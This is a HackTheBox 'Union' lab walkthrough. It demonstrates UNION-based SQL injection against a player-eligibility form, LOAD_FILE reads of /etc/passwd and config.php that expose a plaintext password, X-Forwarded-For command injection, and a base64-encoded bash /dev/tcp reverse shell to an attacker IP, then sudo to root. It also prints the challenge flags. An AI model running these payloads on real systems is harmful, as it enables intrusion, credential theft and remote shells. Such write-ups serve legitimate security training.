# HackTheBox — Union

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Challenge | Union |
| Difficulty | Medium |
| OS | Linux (Ubuntu) |
| IP | 10.129.96.75 |
| Date | October 2026 |
| User Flag | `0254e4e7f57d98a5c4c2ba6d71725d44` |
| Root Flag | `241229c31f18818f2e81556fc5e42724` |

---

## Challenge Summary

Union is a Medium web challenge centered on manual UNION-based SQL injection. The only initially exposed service is HTTP, while SSH is gated by a firewall rule that is removed only after the challenge flag is submitted. The player eligibility form has a response-differential SQL injection in its `player` parameter. Manual column enumeration, `INFORMATION_SCHEMA`, and `GROUP_CONCAT()` reveal the challenge flag and the MySQL service context.

The database account holds MySQL's `FILE` privilege. `LOAD_FILE()` extracts `config.php`, revealing credentials reused by the `uhc` Linux account. Once SSH access is unlocked, the application source exposes an unsanitized `X-Forwarded-For` header in a privileged firewall command. Command injection yields a `www-data` shell with unrestricted passwordless sudo, giving root.

**Skills demonstrated:**

- Two-phase Nmap enumeration
- Response-differential testing for SQL injection
- Manual UNION SQLi, schema enumeration, and `GROUP_CONCAT()`
- MySQL `FILE` privilege and `LOAD_FILE()` abuse
- Application-controlled firewall access analysis
- HTTP-header command injection testing
- Source-code review and sudo privilege escalation

---

## Attack Chain Summary

```
Nmap → HTTP only; SSH is firewalled
Player eligibility form → manual UNION SQLi
INFORMATION_SCHEMA → november.flag(one)
Extract UHC{F1rst_5tep_2_Qualify} → submit to /challenge.php
Server whitelists attacker IP → SSH opens
LOAD_FILE('/var/www/html/config.php') → uhc password
SSH as uhc → user flag
Review firewall.php → X-Forwarded-For command injection
Reverse shell as www-data → NOPASSWD sudo su - → root flag
```

---

## Step 1 — Reconnaissance

Run a two-phase TCP scan: first identify open ports, then perform version and default-script detection on the result.

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(sudo nmap -p- --min-rate=1000 -T4 10.129.96.75 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ sudo nmap -p$ports -sV -sC 10.129.96.75
```

**Output:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

Only port 80 is accessible. The absence of SSH on a Linux target suggests firewall gating rather than a missing SSH service.

The page hosts the **Join the UHC - November Qualifiers** application, with a Player Eligibility Check that accepts a `player` value.

---

## Step 2 — Confirm SQL Injection Through Response Differential

A random value returns a positive eligibility response:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d 'player=randomgibberish123' http://10.129.96.75/index.php
Congratulations randomgibberish123 you may compete in this tournament!
```

A known player, `celesian`, returns a different response:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d 'player=celesian' http://10.129.96.75/index.php
Sorry, celesian you are not eligible due to already qualifying.
```

Adding a quote flips the response back to the no-result branch:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=celesian'" http://10.129.96.75/index.php
Congratulations celesian' you may compete in this tournament!
```

This confirms SQL injection: an error and an empty query both follow the positive-eligibility branch. Comment termination restores the original result:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=celesian'-- -" http://10.129.96.75/index.php
Sorry, celesian you are not eligible due to already qualifying.
```

---

## Step 3 — Manual UNION SQLi and Challenge Flag

Automated tooling produced no useful results, so enumerate manually. Determine the number of columns with a non-existent player:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select 1-- -" http://10.129.96.75/index.php
Sorry, 1 you are not eligible due to already qualifying.
```

The original query contains one reflected column. Identify the database context:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select user()-- -" http://10.129.96.75/index.php
Sorry, uhc@localhost you are not eligible due to already qualifying.

Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select database()-- -" http://10.129.96.75/index.php
Sorry, november you are not eligible due to already qualifying.
```

Use `GROUP_CONCAT()` to flatten multi-row metadata into the one reflected column:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select group_concat(TABLE_NAME,':',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.columns where TABLE_SCHEMA='november'-- -" http://10.129.96.75/index.php
```

**Output:**

```
flag:one
players:player
```

Extract the flag:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select group_concat(one) from november.flag-- -" http://10.129.96.75/index.php
Sorry, UHC{F1rst_5tep_2_Qualify} you are not eligible due to already qualifying.
```

**Challenge flag:** `UHC{F1rst_5tep_2_Qualify}`

---

## Step 4 — Unlock SSH and Extract Credentials

Submit the challenge flag at `/challenge.php`. The site reports:

```
Your IP Address has now been granted SSH Access
```

The application adds an iptables allow rule for the attacker IP, opening port 22. Credentials are still needed.

Use the same UNION injection to verify filesystem reads:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select LOAD_FILE('/etc/passwd')-- -" http://10.129.96.75/index.php
```

The output includes:

```
uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
```

Read the PHP configuration file:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select LOAD_FILE('/var/www/html/config.php')-- -" http://10.129.96.75/index.php
```

**Output:**

```php
$username = "uhc";
$password = "uhc-11qual-global-pw";
$dbname = "november";
```

The MySQL credentials are reused by the local `uhc` account.

---

## Step 5 — SSH as uhc

```bash
Hackerpatel007_1@htb[/htb]$ ssh uhc@10.129.96.75
uhc@union:~$ cat user.txt
0254e4e7f57d98a5c4c2ba6d71725d44
```

| Flag | Value |
| --- | --- |
| User | `0254e4e7f57d98a5c4c2ba6d71725d44` |

---

## Step 6 — Source Review and Header Command Injection

Review the code responsible for granting firewall access:

```bash
uhc@union:~$ cat /var/www/html/firewall.php
```

```php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

`X-Forwarded-For` is entirely controlled by the client and is concatenated directly into `system()`. Confirm command injection with a time delay:

```bash
Hackerpatel007_1@htb[/htb]$ time curl -s -b 'PHPSESSID=<session_cookie>' \
  -H 'X-Forwarded-For: 8.8.8.8; sleep 5;' \
  http://10.129.96.75/firewall.php > /dev/null
```

The five-second delay confirms injection. Start a listener, then send a base64-encoded reverse shell through the header:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9001
Hackerpatel007_1@htb[/htb]$ echo -n 'bash -i >& /dev/tcp/10.10.16.36/9001 0>&1' | base64 -w 0
Hackerpatel007_1@htb[/htb]$ curl -s -b 'PHPSESSID=<session_cookie>' \
  -H 'X-Forwarded-For: 8.8.8.8; echo <base64_payload> | base64 -d | bash;' \
  http://10.129.96.75/firewall.php
```

**Shell:**

```
www-data@union:/var/www/html$
```

---

## Step 7 — Root via www-data Sudo

```bash
www-data@union:/var/www/html$ sudo -l
(ALL : ALL) NOPASSWD: ALL

www-data@union:/var/www/html$ sudo su -
root@union:~# cat /root/root.txt
241229c31f18818f2e81556fc5e42724
```

| Flag | Value |
| --- | --- |
| Root | `241229c31f18818f2e81556fc5e42724` |

---

## Alternative Privilege Escalation — PwnKit

The host also exposes vulnerable Polkit 0.105 with SUID `pkexec`, making CVE-2021-4034 a viable alternative from the `uhc` shell. A static exploit driver avoids glibc compatibility issues on the target. The intended route is the web-source and header-injection path above, because it demonstrates the application’s broken trust boundary and the dangerous sudo policy on `www-data`.

---

## Lessons Learned

- **Use a known database value when comparing application responses.** SQL errors and no-result cases can share an output branch, creating false negatives when testing only random input.
- **Manual UNION SQLi remains essential.** Column count, reflection, `INFORMATION_SCHEMA`, and `GROUP_CONCAT()` are enough to enumerate when automation fails.
- **MySQL FILE turns SQLi into a server file-read primitive.** Application configuration files are high-value targets because they often contain reusable plaintext credentials.
- **A client-supplied forwarding header is never a trusted identity source.** Treating `X-Forwarded-For` as safe input for a shell command is direct command injection.
- **Avoid broad sudo policies for web-service accounts.** `(ALL : ALL) NOPASSWD: ALL` converts any web shell into immediate root access.

---

## Full Attack Chain Reference

```
1. Nmap → port 80 only; SSH gated by firewall
2. Player eligibility form → response-differential SQLi
3. Manual UNION → one column reflected
4. INFORMATION_SCHEMA → november.flag(one)
5. UNION select from november.flag → UHC{F1rst_5tep_2_Qualify}
6. Submit flag to /challenge.php → attacker IP gains SSH access
7. LOAD_FILE('/var/www/html/config.php') → uhc:uhc-11qual-global-pw
8. SSH as uhc → user flag
9. firewall.php source → unsanitized X-Forwarded-For in system()
10. Header-injection reverse shell → www-data
11. sudo -l → NOPASSWD: ALL
12. sudo su - → root flag
```

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- --min-rate=1000 -T4 <IP>` | Full TCP port discovery |
| `curl -X POST -d "player=noresult' union select 1-- -" <URL>/index.php` | Confirm reflected, one-column UNION SQLi |
| `curl -X POST -d "player=noresult' union select group_concat(one) from november.flag-- -" <URL>/index.php` | Extract challenge flag |
| `curl -X POST -d "player=noresult' union select LOAD_FILE('/var/www/html/config.php')-- -" <URL>/index.php` | Read database configuration through MySQL FILE |
| `ssh uhc@<IP>` | Authenticate with reused configuration credentials after SSH unlock |
| `time curl -H 'X-Forwarded-For: 8.8.8.8; sleep 5;'` | Verify header command injection |
| `nc -lvnp 9001` | Listen for reverse shell |
| `sudo -l` | Identify sudo rights on web-service shell |
| `sudo su -` | Escalate from www-data to root |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1595.001 — Active Scanning | TCP port enumeration |
| Initial Access | T1190 — Exploit Public-Facing Application | Manual UNION SQL injection |
| Credential Access | T1552.001 — Credentials in Files | `config.php` extracted with MySQL `LOAD_FILE()` |
| Lateral Movement | T1021.004 — Remote Services: SSH | SSH as `uhc` after firewall access is granted |
| Execution | T1059.004 — Unix Shell | Command injection through `X-Forwarded-For` |
| Privilege Escalation | T1548.003 — Sudo and Sudo Caching | `www-data` has unrestricted passwordless sudo |
